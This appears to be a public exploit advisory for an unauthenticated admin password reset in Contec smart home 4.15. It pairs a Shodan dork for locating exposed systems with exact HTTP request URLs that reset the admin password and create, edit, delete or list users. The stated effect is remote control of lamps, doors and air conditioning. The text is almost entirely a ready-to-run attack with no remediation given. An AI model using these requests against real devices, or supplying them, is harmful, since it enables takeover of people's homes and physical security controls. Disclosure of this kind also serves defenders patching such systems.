# Title              : Contec smart home 4.15 Unauthorized Password Reset
# Shodan Dork		 : "content/smarthome.php"
# Vendor Homepage    : http://contec.co.il
# Tested on          : Google Chrome
# Tested version     : 4.15
# Date               : 2018-03-14
# Author             : Z3ro0ne
# Contact            : saadousfar59@gmail.com
# Facebook Page      : https://www.facebook.com/Z3ro0ne
 
# Vulnerability description :
the Vulnerability allow unauthenticated attacker to remotely bypass authentication and change admin password without old password and control (lamps,doors,air conditioner...)


# Exploit 

 To Reset Admin password 
 http://Ipaddress:port/content/new_user.php?user_name=ADMIN&password=NEWPASSWORD&group_id=1
 
 To Create a new user
 http://Ipaddress:port/content/new_user.php?user_name=NEWUSER&password=NEWPASSWORD&group_id=1
 
  To edit a user
 http://Ipaddress:port/content/edit_user.php?user_name=USER&password=NEWPASSWORD&group_id=1
 
 To Delete a user 
 http://Ipaddress:port/content/delete_user.php?user_name=USER
 
 Users list  
 http://Ipaddress:port/content/user.php